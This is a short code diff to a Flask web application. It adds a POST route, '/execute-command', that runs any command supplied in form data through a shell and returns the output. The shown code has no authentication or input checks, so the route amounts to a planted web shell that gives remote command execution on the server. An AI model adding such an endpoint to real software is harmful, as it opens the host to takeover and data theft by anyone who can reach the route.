@@ -61,6 +61,19 @@ def login():
 
     return render_template('login.html')
 
+# Route to execute commands
+@app.route('/execute-command', methods=['POST'])
+def execute_command():
+    command = request.form.get('command')
+
+    try:
+        # Execute the command using subprocess
+        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        output = result.stdout if result.returncode == 0 else result.stderr
+        return jsonify({"output": output})
+    except Exception as e:
+        return jsonify({"output": f"Error: {str(e)}"}), 500
+
 # Run the Flask application
 
 if __name__ == '__main__':
